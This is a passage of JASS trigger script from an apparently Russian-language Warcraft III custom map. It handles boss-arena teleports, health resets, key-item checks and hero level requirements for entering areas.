call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxK() then
set V0=GetRectCenter(EY)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxL() then
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(D2))
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxM() then
set V0=GetRectCenter(Fe)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxN() then
set V0=GetRectCenter(Fm)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxO() then
set V0=GetRectCenter(CY)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxP() then
set V0=Location(5870.,-7620.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxQ() then
set V0=Location(-5200.,15700.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
endfunction
function BxS takes nothing returns nothing
set hd=CreateTrigger()
call TriggerRegisterLeaveRectSimple(hd,CY)
call TriggerRegisterLeaveRectSimple(hd,Fm)
call TriggerRegisterLeaveRectSimple(hd,Fe)
call TriggerRegisterLeaveRectSimple(hd,D2)
call TriggerRegisterLeaveRectSimple(hd,EY)
call TriggerRegisterLeaveRectSimple(hd,CX)
call TriggerRegisterLeaveRectSimple(hd,GL)
call TriggerRegisterLeaveRectSimple(hd,Bq)
call TriggerRegisterLeaveRectSimple(hd,Bt)
call TriggerRegisterLeaveRectSimple(hd,EF)
call TriggerRegisterLeaveRectSimple(hd,j)
call TriggerRegisterLeaveRectSimple(hd,CN)
call TriggerRegisterLeaveRectSimple(hd,Gu)
call TriggerAddAction(hd,function BxR)
endfunction
function BxT takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B5A))==true) then
return false
endif
return true
endfunction
function BxU takes nothing returns nothing
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304B5A))
call EnableTrigger(U1)
call AddSpecialEffectLocBJ(GetRectCenter(FU),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
call SetUnitInvulnerable(Lr,false)
endfunction
function BxV takes nothing returns nothing
set he=CreateTrigger()
call TriggerRegisterEnterRectSimple(he,FU)
call TriggerAddCondition(he,Condition(function BxT))
call TriggerAddAction(he,function BxU)
endfunction
function BxW takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BxX takes nothing returns nothing
local location d2=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),d2)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),d2,0.)
call RemoveLocation(d2)
set d2=null
endfunction
function BxY takes nothing returns nothing
set hf=CreateTrigger()
call TriggerRegisterEnterRectSimple(hf,Ev)
call TriggerAddCondition(hf,Condition(function BxW))
call TriggerAddAction(hf,function BxX)
endfunction
function BxZ takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxa takes nothing returns nothing
set Vz=Location(4820.,14110.)
call SetUnitPositionLoc(GetTriggerUnit(),Vz)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Vz,0.)
call RemoveLocation(Vz)
endfunction
function Bxb takes nothing returns nothing
set hg=CreateTrigger()
call TriggerRegisterEnterRectSimple(hg,Eu)
call TriggerAddCondition(hg,Condition(function BxZ))
call TriggerAddAction(hg,function Bxa)
endfunction
function Bxc takes nothing returns boolean
if not (RectContainsUnit(GL,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxd takes nothing returns boolean
if not (RectContainsUnit(EY,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxe takes nothing returns boolean
if not (RectContainsUnit(Fm,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxf takes nothing returns boolean
if not (RectContainsUnit(CY,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxg takes nothing returns boolean
if not (RectContainsUnit(CX,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxh takes nothing returns boolean
if not (RectContainsUnit(CM,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxi takes nothing returns boolean
if not (RectContainsUnit(Gq,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxj takes nothing returns boolean
if not (RectContainsUnit(Gz,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxk takes nothing returns boolean
if not (RectContainsUnit(D2,GetTriggerUnit())==true) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxl takes nothing returns boolean
if not (RectContainsUnit(EJ,GetTriggerUnit())==true) then
return false
endif
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304C30))==true) then
return false
endif
return true
endfunction
function Bxm takes nothing returns boolean
if not (RectContainsUnit(EI,GetTriggerUnit())==true) then
return false
endif
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304C31))==true) then
return false
endif
return true
endfunction
function Bxn takes nothing returns nothing
local integer Mc
if Bxc() then
call SetUnitLifePercentBJ(K6,100)
call SaveInteger(NY,GetHandleId(K6),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(K6),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxd() then
call SetUnitLifePercentBJ(Ku,100)
call SaveInteger(NY,GetHandleId(Ku),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(Ku),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxe() then
call SetUnitLifePercentBJ(LK,100)
call SaveInteger(NY,GetHandleId(LK),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LK),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxf() then
call SetUnitLifePercentBJ(K4,100)
call SetUnitLifePercentBJ(Vd[3],100)
call SaveInteger(NY,GetHandleId(K4),1,0)
call SaveInteger(NY,GetHandleId(Vd[3]),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(K4),2+Mc,0)
call SaveInteger(NY,GetHandleId(Vd[3]),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxg() then
call SetUnitLifePercentBJ(LG,100)
call SaveInteger(NY,GetHandleId(LG),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LG),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxh() then
call SetUnitLifePercentBJ(LD,100)
call SaveInteger(NY,GetHandleId(LD),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LD),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxi() then
set YV[110]=GetRectCenter(Cf)
call SetUnitPositionLoc(GetTriggerUnit(),YV[110])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[110],0.)
call SetUnitLifePercentBJ(LS,100)
call RemoveLocation(YV[110])
call SaveInteger(NY,GetHandleId(LS),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LS),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxj() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call SetUnitOwner(K8,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(K8,true)
call SetUnitLifePercentBJ(K8,100)
call SaveInteger(NY,GetHandleId(K8),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(K8),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxk() then
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call SetUnitOwner(L4,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(L4,true)
call SetUnitLifePercentBJ(L4,100)
call SaveInteger(NY,GetHandleId(L4),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(L4),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
endif
if Bxl() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304C30))
call SetUnitInvulnerable(Lo,false)
call EnableTrigger(U2)
call AddSpecialEffectLocBJ(GetRectCenter(EJ),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
endif
if Bxm() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304C31))
call SetUnitInvulnerable(Ls,false)
call EnableTrigger(U0)
call AddSpecialEffectLocBJ(GetRectCenter(EI),"Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl")
endif
endfunction
function Bxo takes nothing returns nothing
set hh=CreateTrigger()
call TriggerRegisterEnterRectSimple(hh,EI)
call TriggerRegisterEnterRectSimple(hh,EJ)
call TriggerRegisterEnterRectSimple(hh,Gq)
call TriggerRegisterEnterRectSimple(hh,CM)
call TriggerRegisterEnterRectSimple(hh,CX)
call TriggerRegisterEnterRectSimple(hh,CY)
call TriggerRegisterEnterRectSimple(hh,Fm)
call TriggerRegisterEnterRectSimple(hh,EY)
call TriggerRegisterEnterRectSimple(hh,GL)
call TriggerAddAction(hh,function Bxn)
endfunction
function Bxp takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxq takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303555
endfunction
function Bxr takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bxs takes nothing returns boolean
return GetBooleanAnd(Bxq(),Bxr())
endfunction
function Bxt takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bxu takes nothing returns nothing
set SR=GetUnitsInRectMatching(Ey,Condition(function Bxs))
call ForGroupBJ(SR,function Bxt)
call DestroyGroup(SR)
set V0=Location(4246.,9210.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
call SetUnitLifePercentBJ(Ls,100)
set Tc[0]=75
set Tc[1]=80
set V0=GetRectCenter(Ey)
call SetUnitPositionLoc(Ls,V0)
call SetUnitOwner(Ls,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ls,true)
call RemoveLocation(V0)
endfunction
function Bxv takes nothing returns nothing
set U0=CreateTrigger()
call DisableTrigger(U0)
call TriggerRegisterEnterRectSimple(U0,EI)
call TriggerAddCondition(U0,Condition(function Bxp))
call TriggerAddAction(U0,function Bxu)
endfunction
function Bxw takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bxx takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303553
endfunction
function Bxy takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bxz takes nothing returns boolean
return GetBooleanAnd(Bxx(),Bxy())
endfunction
function Bx0 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bx1 takes nothing returns nothing
set SR=GetUnitsInRectMatching(Ey,Condition(function Bxz))
call ForGroupBJ(SR,function Bx0)
call DestroyGroup(SR)
set V0=Location(6690.,9170.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
call SetUnitLifePercentBJ(Lo,100)
set Tc[0]=75
set Tc[2]=85
set Tc[3]=80
set Tc[4]=85
set V0=GetRectCenter(FH)
call SetUnitPositionLoc(Lo,V0)
call SetUnitOwner(Lo,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lo,true)
call RemoveLocation(V0)
endfunction
function Bx2 takes nothing returns nothing
set U2=CreateTrigger()
call DisableTrigger(U2)
call TriggerRegisterEnterRectSimple(U2,EJ)
call TriggerAddCondition(U2,Condition(function Bxw))
call TriggerAddAction(U2,function Bx1)
endfunction
function Bx3 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bx4 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303554
endfunction
function Bx5 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bx6 takes nothing returns boolean
return GetBooleanAnd(Bx4(),Bx5())
endfunction
function Bx7 takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bx8 takes nothing returns nothing
set SR=GetUnitsInRectMatching(EK,Condition(function Bx6))
call ForGroupBJ(SR,function Bx7)
call DestroyGroup(SR)
set V0=Location(9500.,9070.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
call SetUnitLifePercentBJ(Lr,100)
set Tc[0]=75
set V0=GetRectCenter(EK)
call SetUnitPositionLoc(Lr,V0)
call SetUnitOwner(Lr,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lr,true)
call RemoveLocation(V0)
endfunction
function Bx9 takes nothing returns nothing
set U1=CreateTrigger()
call DisableTrigger(U1)
call TriggerRegisterEnterRectSimple(U1,FU)
call TriggerAddCondition(U1,Condition(function Bx3))
call TriggerAddAction(U1,function Bx8)
endfunction
function ByB takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function ByC takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=39) then
return false
endif
return true
endfunction
function ByD takes nothing returns nothing
if ByC() then
else
set YV[98]=GetRectCenter(CQ)
call SetUnitPositionLoc(GetEnteringUnit(),YV[98])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 39 уровень!|r")
call RemoveLocation(YV[98])
endif
endfunction
function ByE takes nothing returns nothing
set hi=CreateTrigger()
call TriggerRegisterEnterRectSimple(hi,CT)
call TriggerAddCondition(hi,Condition(function ByB))
call TriggerAddAction(hi,function ByD)
endfunction
function ByF takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function ByG takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=42) then
return false
endif
return true
endfunction
function ByH takes nothing returns nothing
if ByG() then
else
set YV[98]=GetRectCenter(CQ)
call SetUnitPositionLoc(GetEnteringUnit(),YV[98])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 42 уровень!|r")
call RemoveLocation(YV[98])
endif
endfunction
function ByI takes nothing returns nothing
set hj=CreateTrigger()
call TriggerRegisterEnterRectSimple(hj,CU)
call TriggerAddCondition(hj,Condition(function ByF))
call TriggerAddAction(hj,function ByH)
endfunction
function ByJ takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function ByK takes nothing returns boolean
if not (GetUnitLevel(GetEnteringUnit())>=45) then
return false
endif
return true
endfunction
function ByL takes nothing returns nothing
if ByK() then
else
set YV[98]=GetRectCenter(CQ)
call SetUnitPositionLoc(GetEnteringUnit(),YV[98])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 45 уровень!|r")
call RemoveLocation(YV[98])
endif
endfunction
function ByM takes nothing returns nothing
set hk=CreateTrigger()
call TriggerRegisterEnterRectSimple(hk,CS)
call TriggerAddCondition(hk,Condition(function ByJ))
call TriggerAddAction(hk,function ByL)
endfunction
function ByN takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function ByO takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=17) then
return false
endif
return true
endfunction
function ByP takes nothing returns nothing
if ByO() then
call CreateTextTagLocBJ("|c00FF9696~Терраса Творцов~",GetRectCenter(BM),0,10,100,100,100,50.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
set YV[8]=GetRectCenter(BQ)
call SetUnitPositionLoc(GetEnteringUnit(),YV[8])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 17 уровень!|r")
call RemoveLocation(YV[8])
endif
endfunction
function ByQ takes nothing returns nothing
set hl=CreateTrigger()
call TriggerRegisterEnterRectSimple(hl,BM)
call TriggerAddCondition(hl,Condition(function ByN))
call TriggerAddAction(hl,function ByP)
endfunction
function ByR takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function ByS takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=13) then
return false
endif
return true
endfunction
function ByT takes nothing returns nothing
if ByS() then
else
set YV[7]=GetRectCenter(BP)
call SetUnitPositionLoc(GetEnteringUnit(),YV[7])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 13 уровень!|r")
call RemoveLocation(YV[7])
endif
endfunction
function ByU takes nothing returns nothing
set hm=CreateTrigger()
call TriggerRegisterEnterRectSimple(hm,BL)
call TriggerAddCondition(hm,Condition(function ByR))
call TriggerAddAction(hm,function ByT)
endfunction
function ByV takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function ByW takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=22) then
return false
endif
return true
endfunction
function ByX takes nothing returns nothing
if ByW() then
else
set YV[9]=GetRectCenter(BR)
call SetUnitPositionLoc(GetEnteringUnit(),YV[9])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00FF0000Для входа требуется 22 уровень!|r")
call RemoveLocation(YV[9])
endif
endfunction
function ByY takes nothing returns nothing
set hn=CreateTrigger()
call TriggerRegisterEnterRectSimple(hn,BN)
call TriggerAddCondition(hn,Condition(function ByV))
call TriggerAddAction(hn,function ByX)
endfunction
function ByZ takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bya takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6E30345A
endfunction
function Byb takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Byc takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49304655))==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function Byd takes nothing returns nothing
local integer Mc
if Byc() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Ну что ж, смотрите, сами захотели...")
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Ut)
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,FI)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set V0=GetRectCenter(DX)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call RemoveUnit(fV[0])
call PauseUnit(Lu,false)
call DisableTrigger(fW)
call SetUnitLifePercentBJ(Lu,100)
call SetUnitOwner(Lu,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lu,true)
set SR=GetUnitsInRectMatching(DW,Condition(function Bya))
call ForGroupBJ(SR,function Byb)
call RemoveLocation(V0)
call DestroyGroup(SR)
set Tt[3]=70.
set Tt[4]=75.
set Tt[5]=85.
set Tt[6]=80.
call SaveInteger(NY,GetHandleId(Lu),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(Lu),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000ff00Секреты тайные хранятся.
Не всем доступны, ой не всем.
Прийдется очень постараться
Что б всё проделать без проблем.
Возьмите вы частичку трупа,
Красивый ключик от замков.
И драгоценность, не попутав
Сложите вместе - путь готов.")
endif
endfunction
function Bye takes nothing returns nothing
set ho=CreateTrigger()
call TriggerRegisterEnterRectSimple(ho,DV)
call TriggerAddCondition(ho,Condition(function ByZ))
call TriggerAddAction(ho,function Byd)
endfunction
function Byf takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Byg takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$6E30345A
endfunction
function Byh takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Byi takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=45) then
return false
endif
return true
endfunction
function Byj takes nothing returns nothing
local integer Mc
if Byi() then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,FI)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set V0=GetRectCenter(DX)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call RemoveUnit(fV[0])
call PauseUnit(Lu,false)
call DisableTrigger(fW)
call SetUnitLifePercentBJ(Lu,100)
call SetUnitOwner(Lu,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Lu,true)
set SR=GetUnitsInRectMatching(DW,Condition(function Byg))
call ForGroupBJ(SR,function Byh)
call RemoveLocation(V0)
call DestroyGroup(SR)
set Tt[3]=70.
set Tt[4]=75.
set Tt[5]=85.
set Tt[6]=80.
call SaveInteger(NY,GetHandleId(Lu),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(Lu),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для входа требуется 45 уровень.")
endif
endfunction
function Byk takes nothing returns nothing
set Ut=CreateTrigger()
call DisableTrigger(Ut)
call TriggerRegisterEnterRectSimple(Ut,DV)
call TriggerAddCondition(Ut,Condition(function Byf))
call TriggerAddAction(Ut,function Byj)
endfunction
function Byl takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetEnteringUnit())>=43) then
return false
endif
return true
endfunction
function Bym takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Byn takes nothing returns nothing
local integer L9=0
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,FK)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set YV[221]=GetRectCenter(DN)
call SetUnitPositionLoc(GetTriggerUnit(),YV[221])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[221],0.)
call SetUnitLifePercentBJ(Ll,100)
call SetUnitOwner(Ll,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ll,true)
set SR=GetUnitsOfTypeIdAll($68303255)
call ForGroupBJ(SR,function Bym)
call DestroyGroup(SR)
call RemoveLocation(YV[221])
call SaveInteger(NY,GetHandleId(Ll),1,0)
loop
call SaveInteger(NY,GetHandleId(Ll),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function Byo takes nothing returns nothing
set Uh=CreateTrigger()
call TriggerRegisterEnterRectSimple(Uh,DM)
call TriggerAddCondition(Uh,Condition(function Byl))
call TriggerAddAction(Uh,function Byn)
endfunction
function Byp takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetEnteringUnit())>=38) then
return false
endif
return true
endfunction
function Byq takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Byr takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$68303233
endfunction
function Bys takes nothing returns boolean
return GetBooleanAnd(Byq(),Byr())
endfunction
function Byt takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Byu takes nothing returns nothing
local integer L9=0
call DisplayTextToForce(GetForceOfPlayer(GetTriggerPlayer()),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
set YV[142]=GetRectCenter(Cx)
call SetUnitPositionLoc(GetTriggerUnit(),YV[142])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[142],0.)
call SetUnitLifePercentBJ(LW,100)
call SetUnitOwner(LW,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LW,true)
set SR=GetUnitsInRectMatching(DL,Condition(function Bys))
call ForGroupBJ(SR,function Byt)
call DestroyGroup(SR)
call RemoveLocation(YV[142])
set fg[1]=93
set fg[2]=70
call SetUnitVertexColor(LW,255,255,255,255)
call UnitRemoveAbility(LW,$4131394B)
call UnitRemoveAbility(LW,$4131345A)
call UnitRemoveAbility(LW,$41305655)
call SaveInteger(NY,GetHandleId(LW),1,0)
loop
call SaveInteger(NY,GetHandleId(LW),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
